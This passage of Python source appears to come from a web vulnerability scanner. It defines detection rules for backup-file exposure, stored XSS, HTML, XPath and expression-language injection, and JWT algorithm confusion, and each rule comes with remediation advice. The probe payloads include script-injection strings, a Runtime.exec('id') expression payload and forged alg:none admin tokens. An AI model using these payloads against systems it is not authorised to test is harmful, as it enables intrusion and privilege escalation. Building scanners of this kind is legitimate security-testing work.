        for hdr in ("server", "x-powered-by"):
            value = response_headers.get(hdr, "")
            if value and self._VERSION_RE.search(value):
                return 0.85
        return 0.0


# ─── New Rules: Backup / Info ─────────────────────────────────────────────────

class BackupFileRule(Rule):
    _CONTENT_RE = re.compile(
        r'(ref:\s*refs/heads|create table|insert into|'
        r'db_password|db_host|APP_KEY|SECRET_KEY|'
        r'<\?php|PK\x03\x04)',
        re.IGNORECASE,
    )

    def __init__(self):
        super().__init__(
            id          = "backup_files",
            name        = "Backup / Sensitive File Exposed",
            severity    = "HIGH",
            cvss        = 7.5,
            category    = "info",
            payloads    = [
                ".bak", ".old", ".orig", ".backup", ".copy", "~",
                ".git/HEAD", ".env.bak",
                "web.config.bak", "config.php.bak",
                "database.sql", "backup.zip", "dump.sql",
            ],
            locations   = ["path_suffix"],
            remediation = (
                "Remove backup files from web root. Add *.bak / *.old to .gitignore. "
                "Restrict config file access via server rules (deny all)."
            ),
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
        # Anti-FP: Redirect means file not directly accessible
        if status_code in (301, 302, 303, 307, 308):
            return 0.0
        location = (response_headers or {}).get("location", "").lower()
        if "login" in location or "signin" in location:
            return 0.0

        # Must be 200 and different from baseline
        if status_code != 200 or response_body == baseline_body:
            return 0.0

        # Anti-FP: If response is same as homepage (generic 200), it's not a backup
        sim = _text_similarity(response_body, baseline_body, payload)
        if sim > 0.80:
            return 0.0  # Response too similar to normal page

        # Content signature detection (high confidence)
        if self._CONTENT_RE.search(response_body):
            return 0.95

        # File-like content (not HTML page) — check content-type
        ct = (response_headers or {}).get("content-type", "").lower()
        if any(t in ct for t in ["application/octet", "application/zip", "application/sql",
                                   "text/plain", "application/xml"]):
            return 0.80

        # Generic different content (lower confidence - needs review)
        if len(response_body) > 200 and sim < 0.5:
            return 0.55
        return 0.0


# ─── New Rules: Stored XSS / HTML Injection ───────────────────────────────────

class StoredXSSRule(Rule):
    _MARKERS = re.compile(r'BRMXSS[1-4]', re.IGNORECASE)

    def __init__(self):
        super().__init__(
            id          = "xss_stored",
            name        = "Cross-Site Scripting (Stored)",
            severity    = "HIGH",
            cvss        = 8.0,
            category    = "xss",
            payloads    = [
                '<script>/*BRMXSS1*/alert(1)</script>',
                '"><img src=x id=BRMXSS2 onerror=alert(1)>',
                "<svg/onload=/*BRMXSS3*/alert(1)>",
                "'><script>/*BRMXSS4*/alert(document.domain)</script>",
            ],
            locations   = ["query", "body", "json"],
            remediation = (
                "HTML-encode all user-controlled output at render time. "
                "Implement a strict Content-Security-Policy. "
                "Use a DOM sanitiser (e.g. DOMPurify) on output."
            ),
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
        in_response = bool(self._MARKERS.search(response_body or ""))
        in_baseline = bool(self._MARKERS.search(baseline_body or ""))

        if in_response and in_baseline:
            return 0.85   # Marker persisted from previous injection — true stored XSS

        if in_response and not in_baseline:
            # Check: is this just REFLECTED (same request) or truly STORED?
            # If the payload text is also in the response, it's reflected, not stored
            if payload and payload in (response_body or ""):
                return 0.0  # Payload reflected back = reflected XSS, not stored
                            # (XSSReflectedRule will catch this instead)

            # Marker in response but payload NOT reflected = could be stored
            return 0.90

        return 0.0


class HTMLInjectionRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "html_injection",
            name        = "HTML Injection",
            severity    = "MEDIUM",
            cvss        = 5.4,
            category    = "xss",
            payloads    = [
                "<h1>BRMHTMLINJ</h1>",
                "<b>BRMHTMLINJ</b>",
                "<marquee>BRMHTMLINJ</marquee>",
                "<iframe src=x>BRMHTMLINJ</iframe>",
            ],
            locations   = ["query", "body"],
            remediation = (
                "HTML-encode all user input before rendering. "
                "Use a templating engine with auto-escaping enabled."
            ),
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
        if "brmhtmlinj" not in response_body.lower():
            return 0.0
        content_type = response_headers.get("content-type", "").lower()
        return 0.80 if "html" in content_type else 0.70


# ─── New Rules: Injection Variants ───────────────────────────────────────────

class XPathInjectionRule(Rule):
    _ERROR_RE = re.compile(
        r'(xpath.*error|invalid\s+xpath|org\.apache\.xpath|'
        r'javax\.xml\.xpath|xmlexception|xpathexception|'
        r'unterminated\s+string|xpath\s+syntax)',
        re.IGNORECASE,
    )

    def __init__(self):
        super().__init__(
            id          = "xpath_injection",
            name        = "XPath Injection",
            severity    = "HIGH",
            cvss        = 7.5,
            category    = "injection",
            payloads    = [
                "' or '1'='1",
                "' or 1=1 or 'a'='a",
                "') or ('1'='1",
                "' or ''] | //* | //*['",
                "x' or name()='username' or 'x'='y",
            ],
            locations   = ["query", "body", "json"],
            remediation = (
                "Use parameterized XPath queries (XPathFactory with variable resolver). "
                "Never concatenate user input into XPath expressions. "
                "Validate and whitelist all inputs."
            ),
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
        if self._ERROR_RE.search(response_body):
            return 0.90
        if (status_code == 200 and
                len(response_body) > len(baseline_body) * 1.8 and
                len(response_body) > 200 and
                _text_similarity(response_body, baseline_body) < 0.5):
            return 0.65
        return 0.0


class ELInjectionRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "el_injection",
            name        = "Expression Language Injection (EL/SpEL/OGNL)",
            severity    = "CRITICAL",
            cvss        = 9.0,
            category    = "injection",
            payloads    = [
                "${7777*7777}",
                "#{7777*7777}",
                "%{7777*7777}",
                "*{7777*7777}",
                "${7*7}",
                "#{7*7}",
                "T(java.lang.Runtime).getRuntime().exec('id')",
                "${class.classLoader}",
                "*{T(java.lang.Runtime).getRuntime().exec('id')}",
            ],
            locations   = ["query", "body", "json"],
            remediation = (
                "Never pass user input into EL/SpEL/OGNL evaluators. "
                "Use allowlists for expression templates. "
                "Upgrade Spring/Struts to patched versions and disable dangerous features."
            ),
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
        if "60536729" in response_body:   # 7777*7777
            return 0.95
        if re.search(r'uid=\d+\(\w+\)', response_body):  # RCE: id command output
            return 0.99
        if re.search(r'java\.lang\.(Runtime|ClassLoader|Class)', response_body):
            return 0.70
        if "49" in response_body and "49" not in baseline_body:  # 7*7, less reliable
            return 0.55
        return 0.0


# ─── New Rules: JWT Algorithm Confusion ───────────────────────────────────────

class JWTAlgConfusionRule(Rule):
    def __init__(self):
        super().__init__(
            id          = "jwt_alg_confusion",
            name        = "JWT Algorithm Confusion (RS256→HS256)",
            severity    = "CRITICAL",
            cvss        = 9.1,
            category    = "auth",
            payloads    = [
                # HS256-signed admin token — algorithm confusion probe
                ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
                 ".eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyfQ"
                 ".BRAHMASTRA_ALG_CONFUSION_TEST"),
                # alg:none
                ("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
                 ".eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."),
            ],
            locations   = ["header", "cookie"],
            remediation = (
                "Explicitly reject alg:none and unexpected algorithms. "
                "Use an asymmetric key allowlist; never use the public key as HMAC secret. "
                "Validate the 'alg' header strictly on the server side."
            ),
        )

    def detect(self, response_body, response_headers, status_code, payload,
               baseline_body, baseline_status, elapsed) -> float:
        if baseline_status in (401, 403) and status_code == 200:
            return 0.95
        if status_code == 200 and baseline_status not in (200,):
            if re.search(r'\badmin\b', response_body, re.IGNORECASE):
                return 0.80
        return 0.0


# ─── Rule Registry ────────────────────────────────────────────────────────────

# Import production-grade SQLi rules from dedicated module
try:
    from brahmastra.narayanastra.sqli import get_sqli_rules as _get_sqli_rules
    _SQLI_RULES = _get_sqli_rules()
except ImportError:
    _SQLI_RULES = [SQLiErrorRule(), SQLiTimeRule(), SQLiBooleanRule(), SQLiUnionRule(), NoSQLRule()]

# Import passive rules (CSP, HSTS, clickjacking, PII, etc.)
try:
    from brahmastra.narayanastra.passive import get_passive_rules as _get_passive_rules
    _PASSIVE_RULES = _get_passive_rules()
except ImportError:
    _PASSIVE_RULES = []

# Import extra active rules (RFI, code injection, forbidden bypass, etc.)
try:
    from brahmastra.narayanastra.active_extra import get_active_extra_rules as _get_active_extra_rules
    _ACTIVE_EXTRA_RULES = _get_active_extra_rules()
except ImportError:
    _ACTIVE_EXTRA_RULES = []

ALL_RULES: list[Rule] = [
    # Injection — CRITICAL (from dedicated SQLi module)
    *_SQLI_RULES,
    SSTIRule(),
    CommandInjectionRule(),
    LFIRule(),
    SSRFRule(),
    XXERule(),
    DeserializationRule(),
    ELInjectionRule(),
    # XSS / Injection — HIGH
    XSSReflectedRule(),
    StoredXSSRule(),
    PrototypePollutionRule(),
    XPathInjectionRule(),
    # Auth / JWT — CRITICAL/HIGH
    JWTNoneRule(),
    JWTWeakSecretRule(),
    JWTKidRule(),
    JWTAlgConfusionRule(),
    # AuthZ — HIGH
    IDORRule(),
    BFLARule(),
    # Config / Headers — MEDIUM
    CORSRule(),
    CRLFRule(),
    HostHeaderRule(),
    OpenRedirectRule(),
    CSRFRule(),
    CookieSecurityRule(),
    SecurityHeadersRule(),
    DangerousMethodsRule(),
    HTMLInjectionRule(),
    # Info Disclosure — LOW/MEDIUM/HIGH
    SecretsInJSRule(),
    DirListingRule(),
    InfoDisclosureRule(),
    GraphQLIntrospectionRule(),
    ServerBannerRule(),
    BackupFileRule(),
    # Extra Active Rules (ZAP-inspired) — RFI, Code Injection, Forbidden Bypass, etc.
    *_ACTIVE_EXTRA_RULES,
    # Passive Rules — CSP, HSTS, Clickjacking, PII, Hash Disclosure, etc.
    *_PASSIVE_RULES,
]

RULE_BY_ID: dict[str, Rule] = {r.id: r for r in ALL_RULES}


def get_rules_for_profile(profile: str = "full") -> list[Rule]:
    """Return rules filtered by scan profile.

    Profiles:
      full        — all 76 rules
      quick       — CRITICAL severity only
      stealth     — passive rules only (no active injection)
      api_only    — injection + auth + idor categories
      auth_only   — auth + idor categories
      owasp_top10 — OWASP 2021 Top 10 mapped rules
      pci_dss     — PCI DSS 4.0 relevant rules
      api_security— OWASP API Security Top 10
      smart       — full list (engine selects dynamically by tech stack)
    """
    if profile == "quick":
        return [r for r in ALL_RULES if r.severity in ("CRITICAL",)]

    elif profile == "stealth":
        return [r for r in ALL_RULES if r.id in {
            # Original passive
            "cors", "info_disclosure", "dir_listing", "graphql_introspection",
            "secrets_js", "host_header", "open_redirect",
            "cookie_security", "security_headers", "server_banner",
            "dangerous_methods",
            # Dedicated passive rules (all)
            "csp_analysis", "hsts_validation", "anti_clickjacking",
            "insecure_auth", "session_id_url", "private_address",
            "cache_control", "mixed_content", "hash_disclosure", "pii_disclosure",
            # New passive rules
            "cookie_samesite", "app_error", "suspicious_comments",
            "timestamp_disclosure", "content_type_missing", "sri_missing",
            "permissions_policy", "charset_mismatch", "x_powered_by",
            "crossdomain_misconfig", "user_controlled_cookie", "big_redirect",
            "viewstate", "referrer_leak",
        }]

    elif profile == "api_only":
        return [r for r in ALL_RULES if r.category in ("injection", "auth", "idor")]

    elif profile == "auth_only":
        return [r for r in ALL_RULES if r.category in ("auth", "idor")]

    elif profile == "owasp_top10":
        return [r for r in ALL_RULES if r.id in {
            # A01 Broken Access Control
            "idor", "bfla",
            # A02 Cryptographic Failures
            "secrets_js", "server_banner", "cookie_security", "padding_oracle",
            # A03 Injection
            "sqli_error", "sqli_time", "sqli_boolean", "sqli_union",
            "nosql", "cmdi", "xpath_injection", "el_injection", "ssti",
            "ldap_injection",
            # A05 Security Misconfiguration
            "cors", "security_headers", "dangerous_methods",
            "dir_listing", "graphql_introspection",
            "permissions_policy", "cookie_samesite",
            # A06 Vulnerable and Outdated Components
            "info_disclosure", "backup_files",
            "shellshock", "log4shell", "spring4shell",
            # A07 Auth Failures
            "jwt_none", "jwt_weak", "jwt_kid", "jwt_alg_confusion", "csrf",
            # A08 Software Integrity
            "deserialization", "sri_missing",
            # A10 SSRF
            "ssrf", "cloud_metadata",
        }]

    elif profile == "pci_dss":
        return [r for r in ALL_RULES if (
            r.category in ("injection", "auth", "xss", "crypto") or
            r.id in {"security_headers", "cookie_security", "cors",
                     "ssrf", "server_banner", "backup_files",
                     "cookie_samesite", "hsts_validation", "pii_disclosure"}
        )]

    elif profile == "api_security":
        # OWASP API Security Top 10
        return [r for r in ALL_RULES if (
            r.category in ("injection", "auth", "idor") or
            r.id in {"cors", "ssrf", "graphql_introspection",
                     "security_headers", "el_injection",
                     "cloud_metadata", "http_method_tampering"}
        )]

    elif profile == "smart":
        # Engine applies tech-stack filtering dynamically; return all as fallback
        return ALL_RULES

    else:
        return ALL_RULES  # full


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _strip_html(page: str) -> str:
    """Remove HTML tags, scripts, styles. Returns visible text only."""
    if not page:
        return ""
    text = re.sub(r'(?si)<script[^>]*>.*?</script>', ' ', page)
    text = re.sub(r'(?si)<style[^>]*>.*?</style>', ' ', text)
    text = re.sub(r'(?s)<!--.*?-->', ' ', text)
    text = re.sub(r'<[^>]+>', ' ', text)
    text = re.sub(r'\s+', ' ', text).strip()
    return text


def _text_similarity(a: str, b: str, payload: str = None) -> float:
    """
    Page similarity ratio using difflib SequenceMatcher (SQLMap-style).
    Strips HTML, removes reflected payload, uses quick_ratio().
    Returns 0.0-1.0 (1.0 = identical).
    """
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    # Strip HTML to compare visible text only
    text_a = _strip_html(a)[:30000]
    text_b = _strip_html(b)[:30000]
    # Remove reflected payload if provided
    if payload:
        text_a = text_a.replace(payload, '')
        text_b = text_b.replace(payload, '')
    if text_a == text_b:
        return 1.0
    try:
        return round(SequenceMatcher(None, text_a, text_b).quick_ratio(), 4)
    except (MemoryError, SystemError):
        la, lb = len(text_a), len(text_b)
        return min(la, lb) / max(la, lb) if max(la, lb) > 0 else 1.0
